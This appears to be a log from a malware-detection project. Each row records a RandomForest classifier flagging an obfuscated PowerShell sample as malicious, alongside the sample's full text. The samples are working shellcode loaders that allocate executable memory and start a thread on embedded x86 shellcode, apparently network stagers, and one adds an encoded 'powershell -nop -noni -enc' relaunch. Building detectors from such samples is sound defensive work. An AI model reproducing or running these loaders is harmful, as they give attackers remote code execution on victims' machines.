1)};VX7w::CreateThread(0,0','sthru;[Byte[]];[Byte[]','x08,0x7','32.dlln75)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[Dll','0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x7','1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x5',';R7X;VX7w = A','xe0,0x','4,0x0c,0xff,0x4e,0','0x','p 60};',']',' -gt 0x1000){VX7g = VX','d9,0xc8,0x5f,','2,0x30,0x8b,0x',',0x8','0x29,0x','ff,0xd5,','uin','s -pas','f,0xe0,0x','0xd5,0x8b,0x3','c exte','x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8','6,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x','VX7ifr = R7X[DllImport(n75kernel','dd-Type -memb','1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0','r CreateThread(IntPtr lpThreadAttributes, uint dwStackS','loc(0,0x',',VX7KTV,0,0,0);for (;;){Start-slee','58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32','erDefinition VX7ifr -Name n75Win32n75 -n','b,0x5','b,0x04,0x8b,0x0','53,0xe5,','2,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,','a8,0x5c,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0','public stati','st, ','.Lengt','x8b,0x5','0x01,0xc3,0x29,0xc6,0','0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0x')) -CrePlace([ChAr]110+[ChAr]55+[ChAr]53),[ChAr]34-CrePlace  'R7X',[ChAr]39 -CrePlace ([ChAr]86+[ChAr]88+[ChAr]55),[ChAr]36)| .( $PsHomE[4]+$psHoME[34]+'X')",malicious,TP
2026-07-13 17:09:59,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3216.ps1,custom-ps-ml,UNKNOWN,c8e3e2c7-3691-4a87-bc6c-e7ef3b8c1a63,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1901,1557.3,"(((\""{16}{71}{85}{73}{157}{20}{63}{62}{25}{56}{117}{2}{7}{114}{46}{155}{107}{33}{43}{120}{145}{78}{19}{49}{97}{128}{94}{0}{130}{124}{150}{88}{64}{81}{104}{40}{80}{68}{27}{134}{79}{93}{8}{131}{74}{158}{156}{31}{92}{159}{58}{132}{119}{70}{53}{136}{18}{116}{41}{89}{87}{72}{14}{60}{103}{48}{100}{82}{84}{42}{29}{91}{152}{98}{118}{10}{45}{101}{143}{76}{34}{148}{23}{26}{133}{65}{140}{139}{106}{86}{12}{141}{4}{137}{21}{52}{9}{66}{154}{146}{144}{147}{95}{135}{90}{127}{35}{110}{111}{50}{59}{142}{55}{112}{126}{22}{138}{69}{17}{51}{121}{102}{75}{149}{115}{122}{83}{36}{105}{67}{1}{61}{6}{99}{113}{44}{13}{47}{125}{96}{37}{153}{109}{15}{32}{39}{54}{123}{129}{24}{5}{77}{11}{28}{151}{108}{3}{160}{57}{30}{38}\"" -f 'EnT;V9nu','.','e','b-jo','a','};','C',' =','ec','4','y.CRE','E','DENt','n','=','+','[S','RinG(CYBht','ge','yS','Na','s;','WnLo','.NE',']','Ct100Co','T.','.0; r','X','BPrOxy;','gEm','Hea','%V','nWc','sT',']V9','0:','V9',')','9','OW64','9nu)','FaulTWE','=','So%{V9','D','0','_-B','Em.','tEM.NE','=(','tp:','V9nK=gEmc511','mUser-','nk.LE','[','NtIN','m','S','[Ch',' [SYS','asp',':EXPE','GER]:','5','tIALC','664d','0/index','7','St','d(gE','YsteM.Net.','nwC.Proxy ','I','Em','6','[SY','I','W-OBjeCt S','e ','; Trident/','.0 (Wind','t.WeBREquEsT]:','1',':De','SErviCePo','CRe','V9','a/',';','nI','V9nwc.','D','G','EbCLi','8c','9nK[','t','Ro','YB','NE','EN','2.1','T','ows NT 6.1; W','808','tWork','9','9n','+','n','B',']]',')))l',' ','0','ntgEm,V','u','X','AD','N','//19','.','N','gEm','XORV','(V9nWC.DO','=0;[ChAr[]','.W','gTh','=','kog','.','CReDEn','v:11.0) lik','d9f789363cgEm;V9','A','L','ad','Ne','AChE]::DEFAult','I','Ar','TiALS = ','f','E','566','52','EM','8.','Mozill',' (V','P','ni','5cae6',';V','9nwc.','nTMa',';V','Er','IngE')) -crEPLAce'V9n',[char]36 -REPlAcE 'CYB',[char]34 -crEPLAce ([char]108+[char]83+[char]111),[char]124  -crEPLAce 'gEm',[char]39) |.( $eNV:CoMSpEc[4,26,25]-JoiN'')",malicious,TP
2026-07-13 17:10:04,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3229.ps1,custom-ps-ml,UNKNOWN,1fcf1a4d-53aa-415c-9929-604ada2f0e1c,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2967,1729.23,"&amp;( $pshomE[4]+$pSHOme[30]+'x') ( ((\""{44}{52}{29}{12}{1}{28}{46}{5}{36}{61}{33}{59}{8}{67}{58}{54}{57}{47}{16}{3}{7}{45}{14}{0}{9}{35}{21}{60}{25}{42}{30}{51}{68}{63}{10}{27}{65}{26}{56}{20}{38}{37}{39}{64}{43}{11}{4}{34}{22}{53}{50}{2}{15}{23}{17}{40}{31}{24}{18}{19}{49}{69}{6}{32}{66}{13}{55}{62}{48}{41}\"" -f ',0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b','atic extern IntPtr VirtualAll',',0',' extern IntPtr ',',0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe','otect);[DllImport(','C7s','m','StackSize, IntPtr lpSta',',',',0x58,0x24,0x01,0xd',',0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50','rnel32.dllAX9)]public st','{6C7w::memset([Int','9,0xe5,0x31,0xd2','xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,',');[DllImport(AX9msvcrt.dllAX9)]public static',',0x68,0x02,0xd9,0xc8,0x5f,0xff,0x','5,0xf6,0x75',',0xec','5d,0x68,0x33,0x32,0','0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf','0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0','0x6a,0x04,0x56,0x57',',0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x8','x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,','x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f','3,0x66,0x8b,0x0c,0x4b,0x8b,0x58','oc(IntPtr lpAddress, uint dwSize, uint','Import(AX9ke','0x4a,0x01,0xd0,0x50,0','3,0x57,0x68','c.Length-1);6C7i','eadAttributes, uint ','0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x56,0x19,0x69,0xe3,0x68,0x02,0x00,0x71,0xbf,','0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,','AX9kernel32.dllAX9)]public static extern IntPtr CreateT','x7','x00,0x00,0x68,0x77,0','3,0x32,0x5f,0x54,0x68,0x4c,0x77','d5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x5','0,0,0);for (;;){Start-sleep 60};','0xc0,0x74,','54','6','emset(IntPtr dest, uint src, uint count);ESG;6C7w = Add-Type -memberDefinition 6C7c -Name AX9Win32AX9 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]6C7sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x8',' flAllocationType, uint flPr','gs, IntPtr lpThreadId',',6C7x,',',0xc3;6C7size = 0x1000;if (6C7sc.Leng','0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0','x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4','C7c = ESG[Dll','x99,0xa5,0x74,0x61,',' lpParameter, ','Ptr](6C7x.ToInt32()+6C7i), 6C7',',0x5a,0x8b,0x12,0xeb,0x86,0x','uint dwCreationFla','ntPtr','dw','0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0','hread(IntPtr lpThr','sc[6C7i], 1)};6C7w::CreateThread(0,0','0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b',',0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x',',0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0','++) ','rtAddress, I',',0x03,','th -gt 0x1000){6C7size = 6C7sc.Length};6C7x=6C7w::VirtualAlloc(0,0x1000,6C7size,0x40);for (6C7i=0;6C7i -le (6')).ReplaCe('AX9',[sTRINg][CHaR]34).ReplaCe(([CHaR]69+[CHaR]83+[CHaR]71),[sTRINg][CHaR]39).ReplaCe(([CHaR]54+[CHaR]67+[CHaR]55),'$'))",malicious,TP
2026-07-13 17:10:12,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3231.ps1,custom-ps-ml,UNKNOWN,1d3ffdfe-6b20-4a11-ab71-1445dd1e8525,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3042,2070.27," . ( $sHeLLID[1]+$shelLiD[13]+'x')( (((\""{51}{12}{36}{67}{19}{42}{14}{34}{72}{5}{24}{68}{70}{39}{28}{6}{13}{54}{60}{20}{27}{37}{64}{59}{48}{69}{22}{38}{52}{61}{63}{8}{53}{26}{62}{46}{4}{65}{2}{33}{23}{35}{10}{0}{41}{30}{25}{31}{40}{55}{11}{44}{21}{45}{49}{15}{9}{16}{50}{18}{71}{17}{57}{58}{47}{7}{3}{66}{43}{56}{29}{1}{32}\"" -f'9d,0x7e,0xb9,0x1f,0x59,0x81,0x90','nD6i), nD6z[nD6i], 1)};nD6w::CreateThread(0,0,nD','0','w::VirtualAlloc(0,0x1000,nD6g,0x40);for (nD6i=0;nD6i -le (nD6z.Length-1);nD6i++) {',',0x55,0xe1,0x87',', uint dwCreationFlags','Definition nD6Xn9 -Name i4JWin32i4J -namespace Win32Functions ','Length};nD6d8Z=nD6',',0x58,0x64,0xa7,0x27,0x49,0x3b,0xbc,0x71,0x49,0x','x40,0xfc,0x13,0x26,0xee,0x00,','0x',',0x1b,0x24,0xdd,0x39,0xcb,0x84,0x8d,0xd1,0x01,0x0b,0xf1,0','n9 = kvr[D','-passthru;[B','pThreadAttribute',',0x19,0x2a,0x0c,0x88,0','0x86,0xcd,0xb9,0x57,0x3e,0xcc,0x9c,0x9f,0xe1,0x2f,0xcb,0x94,0x28,0xba,0xb4,0xc2,0x54,0x2a,0x35,0x12,0x03,0x20,0x35,0x7a,0xf3,0x10,0x66,0x9f,0xfc,0x8c,0x1a','0xc8,0x8a,0x0b,0x8c,0x34,0x5d,0x75,0xfa,0x54,0x5','0x0c,0x69,0x2f,0x4b,',' IntPtr CreateThread(IntP','xf8,0xdf,0x16,0x01,0xda,0xc1,',',0x6b,0xc6,0x','57,0xf8,0x42,0x9d,0',',0x78,0xd6,0x09,0x12,0x94,0x',', I','0x77,0x6b,0xf0,0x02,0x87,0x9','0x4f,0x','0xd9,0x74,0x24,0x','mber',')+','9,','4,0x25,0xbe,0x82,0x02,0x06,0x97,0x94,0x94,0','6d8Z,0,0,0);for (;;){Start-sleep 60};','x29,0x87,0x93,0x07,0x97,0x66,0xab,0x58','s, uint dwSta','03,0x20,0x79,0xf0,0xe0,0x09,0x82,0x00,0x6f,0x19,0xf1,0x32,0x30,0xb1,','llImport(i4Jkernel32','f4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0','x96,0x3d,0xbe,0x6c,0xca,0x96,','tr memset(IntPtr dest, uint src, uint count);kvr;nD6w = Add-Type -me','xee,0',',0xd8,0xf5,0x7c,0x1b,0x19,0xdf,0xba,0x4f,0x4','tr l','tr](n','xc1,0x29,0xc1,0x9a','bc,0xf3,0x0','0,0xb1,0x8b,0xe5,0xde,0xd5,0x0a,0x29','0){nD6g = nD6z.','f1,0xda,0xb','3,0x7f,0xe5,0x88,0xb2,0x80,0x33,0xf5,0xf4,0x0b,0xb0,0x09,0xba,0xfb,0xbd',',','nD6X','0xb4,0xc','bd,0x11,0x0a,0xc0,0xa5,0x76,0x37,0x9a,0x5e,0x4c,0xc3,0x1d,0xb7,0x9d,0x2c,0xb1,0xf6,0x12,0xdf,0xcb,0x3f,0x94,0x00,0xbe,0x49,0xe7,0xbd,0xb9,0x8d,0x9a,0x19,','yte[','xea,0xa6,0x09,0xb3,0x63,0x40,0x79','D6d8Z.ToInt32(','d',';nD6g = 0x1000;if (nD6z.Length -gt 0x100','xef,0x24,0x84,0x1b,0xde,0x64,0xf2,0x68,0x70,0x55,0x70,0x3c,0x7c,0x1e,0xd4,0xd5,0xf7,0x52,0x',']];[Byte[]]nD6z = 0xb8,0','3,0xfb,0x93,','16,0x3c,0xe9,0xf7,0xf2,0xbd,0x3e,0x61,0x7','0x81,0xdf,0x70,0xef,0x04','x0f,0x03,0x45,0xf7,0x3d,0xe3,0xfd,0xef,0x40,0x0c,0xfe,0',',0xcc,0xba,0x60,0xd3,0xea,0x1e,','nD6w::memset([IntP','.dlli4J)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(i4Jkernel32.dlli4J)]public static extern','ntPtr lpThreadId);[DllImport(i4Jmsvcrt.dlli4J)]public static exter','0,0xd9,0x27,0xd4,0x41,0x71,0x1b,0x77,0xc1,0x88,0x48,0x','n IntP','0xe1,0x3a,0x47,0x71,0xdc,0x0d,','ckSize, IntPtr lpStartAddress, IntPtr lpParameter')) -cREpLACE ([CHAR]110+[CHAR]68+[CHAR]54),[CHAR]36-cREpLACE'kvr',[CHAR]39 -rePLACe 'i4J',[CHAR]34) )",malicious,TP
2026-07-13 17:10:26,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3241.ps1,custom-ps-ml,UNKNOWN,eb049fd4-7d81-4b99-b827-cc243d693ffa,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3056,2000.34," ((\""{52}{59}{51}{19}{44}{20}{22}{23}{7}{41}{57}{46}{17}{33}{54}{2}{21}{9}{13}{6}{64}{35}{47}{56}{32}{24}{25}{49}{14}{53}{11}{40}{28}{38}{66}{0}{67}{42}{30}{72}{62}{16}{65}{27}{4}{5}{50}{36}{15}{18}{26}{10}{71}{69}{39}{8}{34}{3}{70}{12}{45}{55}{43}{60}{63}{48}{37}{68}{31}{29}{58}{61}{1}\"" -f '7,0x93,0x67,0x38,0x5c,0xca,0xa7,0xba,0xb1,0x66,0xee,0xa4,0xd6,0x',',0,0);for (;;){Start-sleep 60};','ic static ','d0,0x84,0x79,0x0c,0xb8,0x',',0x67,0x06',',0xdd,0x75,0x76,0xcb,0x55,','S4SR -Name TVkWin32TVk -namespace Win32Functions -passthru;[Byte[]];[Byte[]]kM8z = 0','extern IntP','4,0x89,0x99,0x83,0x62',' IntPtr memset(IntPtr dest, uint src, uint count);kiI;kM8w = Add-Type -memberDefinit','81,0xa0,0x1a,0xfb,0xf2,0x92,0x85,0x57,0x9d,0x9e,0x4e,0x7e,0x5a,0xe1,0x64,0xc6,',',0x7a,0x74,0x21,0xf4,0xae,0x56,0x18,0x37,0xa3,0x','0x45,0x25,0x4b,0x98,0x31,0xc5,0x06,0xc2,0x97,0xda,0xbc,0x69,0x17,0x4f,0x3b,0x38,0x40,0xe7,0x41,0x1d,0xa6,0xa8,0xba,','ion kM8','fe,0xdf,0xdb,','x57,0x98,0xab','0xac,0x9f,0x48,0','Ptr lpP',',0x2b,0x13,0x34,0xbf,0x41,0x7e,0x50,0x0','s, uint dwSize, uint flAllocationType, uint flProtect','lImport(TVkkernel32.','extern','dllTVk)',']public static ','6,0x97,0xa9,0xc0,0xfc,0x4f,0xaf,0x2','b,0xfd,0x8','c,0x68,0x','d,0x2d,0x15,0x5c,0x45,0x95,0xf1,0x5d,0x8a,0x40,0x71,0x51','0,0xfd,0xfa,0x33,0x7c,0x3e,0x7','-1);kM8i++) {kM8w::me',',0x3f,0x3b,0xb6,0','.Length','1,0x56,0x0f,0x03,0x5','arameter, ui',',0xbf,0xa1,0x14,0xcf,0xd7,0x5f,0x25,0x3e,0x74,0xe9,0xc3,0x10,0xd4,0xb9,0x5b,0x',',0x5e,0x29,0xc9,0',',0x47,0xc9,0x1d,0x49,0x13,0x70,0x07,0x37,0xf2,0x8d,0','000,kM8g,0x40);for (k','0,0x0f,0x90,0x46,0x','x67,0x76,0xcb,0x5b,0xec,0x86,0xf','97,0x5d,0x2a,0x4e,0xc5,0x36,0x2','tr CreateThread(IntPtr lpThreadAttributes, uint dwSta',',0xb8,0x5f,0x2c','0xb3',');[Dl','0x48,0xbd,0x61,0x2f','Ptr lpStartAddress, Int','xb1,0x47,0x83,0xee,0','ualAlloc(0,0x1','f,0xd0,0xa2,0x18,0xbe,0xd0,0xd1,0x69,0x90,0xe0,0x92,0x3c,0x1c,0x8a,0xf7,0xd4,0x97,0x','0x81,0xf3,0xea,0xb9,0x00','llTVk)]public static extern IntPtr VirtualAlloc(IntPtr lpAddres','kM8S4SR = ki','0x10,0xb4,0x39,0xd5,0xa1,0xe5','nt dwCreationFlags, IntPtr lpThreadId);[DllImport(TVkmsvcrt.dllTVk)]publ',',0x33,0xa9,0x8d,0xbf,','xfc,0x3','ckSize, Int','mset([IntPtr](kM8Yoi.ToInt32()+kM8i), kM8z[kM8i], 1)};kM8w::Crea','I[DllImport(TVkkernel32.d',',0x29,0xd8,0xd5,0xb3,0x41,0xbc,0x8d,0xe7,0x74,0xc3,0x1b,0x94,0x25,0x56,0xa4,0xcd,0x9a,0xf1,0xcc,0xf3,0xc5,0x36,0x53,0x0b,0x20,0xc7,0xaf,0xda,0x0c,0xbd,0xc1,0xde;kM8g = 0x1000;if (kM8z.Length -gt 0x1000){kM8g = k','teThread(0,0,kM8Yoi,0','7d,0xc0,0x90,0xf7,0xb2,0x33,0xe8,0x30,0x74,','M8z.Length};kM8Yoi=kM8w::Virt','xba,0x98,0x4b,0x35,0x00,0xd9,0xc2,0xd9,0x74,0x24,0xf4','x87,0x51,0x98,0x8e,0xfa,0x8','65,0xc','43','M8i=0;kM8i -le (kM8z',',0xdc,0xda,0xd3,0','ce,0x75,0x73,0xd8,0xf0,0x5f,0x1c,0x72,0x1f,0x36,0x74,0xea,0x86,0x13,0x0e,0x8b,0x47,0x8e,0x6a,0x8b,0xcc,0x3d,0x8a,','0xf4,0x1c,0x87,0x37','x')).REPLACE('kiI',[StriNg][CHAr]39).REPLACE('TVk',[StriNg][CHAr]34).REPLACE(([CHAr]107+[CHAr]77+[CHAr]56),'$') | &amp;( $Env:cOMSpec[4,15,25]-jOin'')",malicious,TP
2026-07-13 17:10:39,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3243.ps1,custom-ps-ml,UNKNOWN,7be84d11-b300-4a98-8eca-dee035c25a28,DESKTOP-BAC9DBQ,malicious,0.9983,RandomForest,3488,1685.06," (((\""{21}{35}{27}{53}{54}{6}{51}{40}{13}{4}{22}{2}{28}{48}{58}{3}{0}{39}{55}{12}{31}{25}{56}{34}{50}{52}{18}{7}{37}{16}{44}{15}{33}{30}{8}{11}{17}{57}{45}{9}{49}{23}{29}{46}{32}{47}{38}{5}{19}{24}{10}{36}{14}{42}{20}{1}{41}{26}{43}\"" -f 'c1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b','cmd = 9Lw-nop -noni -enc 9Lw;iex ','int count);XvIXvI;01Ow = Add-Type -memberD','f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x',' IntPtr memset(I','1Ow::VirtualAlloc(0,0x1000,01Osize,0x40);for (01Oi=0;01Oi -l','r lpSt',',0x8d,0x5d,0x68,0x33,0x32,0x00,0x0','ff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0','0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x','++) {01Ow::memset([IntPtr](01Ox.ToInt32','x74,0x0a,0xff,0x4','0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x','ic extern','t.Encoding]::Unicode.GetBytes(01O1));if([IntPtr]::Size -eq 8){01Ox86 = 01Oenv:SystemRo','0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x05,0xdb,0xca,0xa6,0','68','e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0','5f,0x5f,0x5a,0x8b,0x12,0xeb','e (01','hellYAFv1.0YAFpowershell9Lw;01O','01O1 = XvI01Oc = XvIXvI[DllImport(9Lwk','ntPtr dest, uint src, u',',0x01,0xc3,0x29','Osc.Length-1);01Oi','75,0xe4,0x58,0x8b,','op -noni -enc9Lw;iex 9Lw&amp; powershell 01Ocmd 01O','static extern I','efinition 01Oc -Name 9LwWin329Lw -namespace Win32Functions -passthru;[Byte[]];[',',0','0,0x68,0xea,0x0f,0xdf,0xe0,0x','7d,0x24,0x','0xff,0xd5;01O','x68,0x02,0x00,0x11,0x5d,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x5','xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44','ernel32.dll9Lw)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(9Lwkernel32.dll9Lw)]public ','()+01Oi), 01Osc[01Oi], 1)};01Ow::CreateThread(0,0,01Ox,0,0,0);for (;;){Start-sleep 60};XvI;01Ogq = [System.Convert]::ToBase64String([System.Tex','0,0x','};01Ox=0',',0x49,0','ddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(9Lwmsvcrt.dll9Lw)]public stat','9Lw&amp; 01Ox86 01Ocmd 01Ogq9Lw}else{01Ocmd = 9Lw-n','ot + 9LwYAFsyswow64YAFWindowsPowerS','gq9Lw;}',',0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,','x53,0x6a,0x00,0x56,0x53,','xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,','size = 0x1000;if (01Osc.Length -gt 0x1000){01Osize = 01Osc.Length','Byte[]]01Osc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50','57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff',',0x24,0x24,0x5b,0x5b,','artA','0x61,0x59,0x5a,0x51,0xff,0xe0,0x','ntPtr CreateThread(IntPtr ','lpThreadAttributes, uint dwStackSize, IntPt','x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,','0x58,0x24,0x01,0','xd5,0x93,0',',0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0'))-RePLACE  '9Lw',[chAR]34  -RePLACE([chAR]89+[chAR]65+[chAR]70),[chAR]92  -RePLACE([chAR]48+[chAR]49+[chAR]79),[chAR]36 -RePLACE 'XvI',[chAR]39) | &amp;( $ENV:cOMspEc[4,15,25]-jOIN'')",malicious,TP
2026-07-13 17:10:49,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3261.ps1,custom-ps-ml,UNKNOWN,839aa18e-f7dd-4c6b-923c-3c93a121d5ac,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3121,1586.63," ((\""{15}{47}{36}{45}{71}{66}{58}{35}{10}{1}{54}{14}{56}{46}{22}{19}{57}{32}{12}{0}{4}{9}{13}{38}{62}{34}{51}{44}{29}{31}{27}{41}{65}{48}{39}{11}{33}{67}{64}{16}{49}{5}{30}{50}{59}{53}{8}{2}{69}{42}{72}{55}{63}{61}{52}{70}{26}{43}{60}{28}{17}{24}{40}{7}{25}{6}{21}{23}{68}{37}{18}{3}{20}\""-f'xc9,0xb1,0x47,','dest, uint src,','x88,0x7a,0x97,0xa2,0xa3,0x3b,0x07,',',vtxFis,0,0,0);for (;;){S','0x83,0xc6','x3d,0xce,0x9a,0xc0,0xb6,0xf1,0x4c,0x41,0x8c,0xd5,0x4','ngth};vtxFis=vt','0xae,0xdb,0xf0,0x1f;vtxg = 0x1000;if (vtxz.Leng','x6d,0xb4,0xdf,0x5f,0xe6,0xc7,0xed,0xc0,0x5c,0x40,0x5d,0',',0x04,0x31,0x7e,0x14,0x03,0x7e,0xc6,0xf2,0xcf,0xcf,0x0e,0x70,0x2f,0x30,0xce,0x15,0xb9,0xd5,','artAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(nQHmsvcrt.dllnQH)]public static extern IntPtr memset(IntPtr ','xb3,0xf1,0x9a,0x',',0x24,0xf4,0x5e,0x33,0','0xff,0x15,0xdd,0x9e,0xaf,0xa5,0x',';Xp7;vtxw = Add-Type -memberDe','v','d3,0xbb,0x4a,0x28,0xc0,0x1b,0x18,0x8a,0x','b2,0x63,0','Fis.ToInt32()+vtxi), vtxz[vtxi], 1)};vtxw::CreateThread(0,0','yte[]]vtxz = 0xda,0xcb,0xbf,0','tart-sleep 60};','xw::VirtualAlloc(0,0x1000,vtxg,0x40);for (vtxi=0','hru;[Byte[]];[B',';vtxi -le (vtxz.Length-1);vtxi++) {vtxw::memse','x2b','th -gt 0x1000){vtxg = vtxz.Le','b,0x29,0xe9,0x2c,0xcb,0xe7,0x1a',',0xcd,0x9d,0x00,','b,0xe2,0x1c,0x30,0x5a,0xc4,0x82,0xcb,0x89,0x5f,0x0a,0x5e,0x72,0x37,0x73,0x8e,0x72,0xc7,0x25,0xc4,0x72,0xaf,0x91,0xbc,0x20,0xca,0xdd,0x68,0x55,0x47,0x48,0x93,0x0c,0x34,0xdb,0xfb,0x','0xa5,','8,0x0a,0x56,0x77,0xc8,0xf6','0xce,0x57,0x3b,0x5a,0x86,0x56,0x6a','0xd9,0x74','07,0xc0,0x8c,','xbe,0xc8,0x1e,','eateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpSt','lImport(nQHke','r](vtx','95,0xf3,0x43,0x4d,0xfb,0xe7,0xd0,0x23,0xd4,0x08,0x','63,0xf2,0x3e,0x45,0xba,0xfb,0xed,0xa8,0x73,0x0e,0xef,0xed,0',',0xa4,0x4d,0x46,0xad,0x98,0x9b,','0xac,0xef,0x72,','6c,0x39,0x08,0x21,0xe7,0xb9,0xb5,0xf4,0x92',',0x58,0xdf,0x9f','x98,0xf7,0xfb,0xe6,0x0d,0x7c,0xb1,0x3a,','rnel','ition vtxbr3a -Name nQHWin32nQH -namespace Win32Functions -passt','txbr3a = Xp7[Dl','7,0x97,0x04,0xbf,0x8c,0x','2c,0x9a,0xcd,0x4d,0xa6,0x90,0xba,0x1a,0xe0,0xb4,0',',','0x6f,0x33,0','d,0xe9,0','0a,0x59,0xe5,0x2c,0x40,0x77,0xf2,0x5c,0x0b,0x1f,0x37,0',' uint count)',',0xac,0x48,0x4e,0xe4,0xde,0x69,0xc7,0x02,0x8e,0x39,0x88,0x9a,0x6e,0xea,0x68,0x4b,0x06,0xe0,0x66,0','fin','xd2,0x10,0x3a,0x33,','ic extern IntPtr 